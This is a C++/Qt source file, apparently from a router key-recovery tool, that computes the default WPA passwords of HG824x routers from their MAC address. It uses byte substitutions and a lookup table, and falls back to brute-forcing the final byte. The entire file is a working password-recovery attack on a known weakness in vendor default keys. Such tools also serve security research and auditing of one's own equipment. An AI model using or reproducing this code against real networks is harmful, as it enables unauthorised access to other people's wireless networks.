/*
 * HG824xKeygen.cpp
 *
 *  Created on: 5 de Ago de 2012
 *      Author: ruka
 */

#include "HG824xKeygen.h"
#include <QHash>

HG824xKeygen::HG824xKeygen(QString ssid, QString mac) :
		Keygen(ssid, mac) {
    kgname = "HG824x";
}



QVector<QString> & HG824xKeygen::getKeys() {
    QString mac = getMacAddress();
    if ( mac.size() != 12 )
            throw ERROR;
    QString wpaPassword;
    wpaPassword.append(mac.mid(6,2));
    int lastPair = mac.mid(10,2).toInt(0, 16);
    if ( lastPair <= 8 ) {
        int fifthPair = (mac.mid(8, 2).toInt(0, 16) - 1) & 0xFF;
        wpaPassword.append(QString::number(fifthPair, 16));
    } else {
        wpaPassword.append(mac.mid(8,2));
    }
    int lastChar = mac.mid(11).toInt(0, 16);
    if ( lastChar <= 8 ) {
        int nextPart = (mac.mid(10,1).toInt(0, 16)-1) & 0xF;
        wpaPassword.append(QString::number(nextPart, 16));
    } else {
        wpaPassword.append(mac.mid(10,1));
    }
    switch (lastChar) {
        case 8:
            wpaPassword.append("F");
            break;
        case 9:
            wpaPassword.append("0");
            break;
        case 0xA:
            wpaPassword.append("1");
            break;
        case 0xB:
            wpaPassword.append("2");
            break;
        case 0xC:
            wpaPassword.append("3");
            break;
        case 0xD:
            wpaPassword.append("4");
            break;
        case 0xE:
            wpaPassword.append("5");
            break;
        case 0xF:
            wpaPassword.append("6");
            break;
        case 0:
            wpaPassword.append("7");
            break;
        case 1:
            wpaPassword.append("8");
            break;
        case 2:
            wpaPassword.append("9");
            break;
        case 3:
            wpaPassword.append("A");
            break;
        case 4:
            wpaPassword.append("B");
            break;
        case 5:
            wpaPassword.append("C");
            break;
        case 6:
            wpaPassword.append("D");
            break;
        case 7:
            wpaPassword.append("E");
            break;
        default:
            throw ERROR;
    }
    // TODO: There are more than one values for some of lastPasswordHash
    QHash<QString, QString> lastPasswordHash;
    lastPasswordHash["00"] = "0D";
    lastPasswordHash["08"] = "05";
    lastPasswordHash["10"] = "0E";
    lastPasswordHash["20"] = "1F";
    lastPasswordHash["28"] = "03";
    lastPasswordHash["48"] = "24"; // 57
    lastPasswordHash["68"] = "39";
    lastPasswordHash["70"] = "20";
    lastPasswordHash["78"] = "04";
    lastPasswordHash["80"] = "06";
    lastPasswordHash["9C"] = "2A";
    lastPasswordHash["AC"] = "1A";
    lastPasswordHash["CC"] = "12";
    lastPasswordHash["D4"] = "23"; // 35
    lastPasswordHash["E0"] = "0C"; // 31
    lastPasswordHash["F8"] = "21"; // 4E
    if (lastPasswordHash.contains(mac.mid(0,2))) {
        results.append(wpaPassword.toUpper() + lastPasswordHash[mac.mid(0,2)].toUpper());
    } else {
        /* Bruteforce if not found */
        QString last;
        for (int i=0; i <= 255; i++) {
            last = QString("%1").arg(i, 2, 16, QLatin1Char('0'));
            results.append(wpaPassword.toUpper() + last.toUpper());
        }
    }
    
	return results;
}

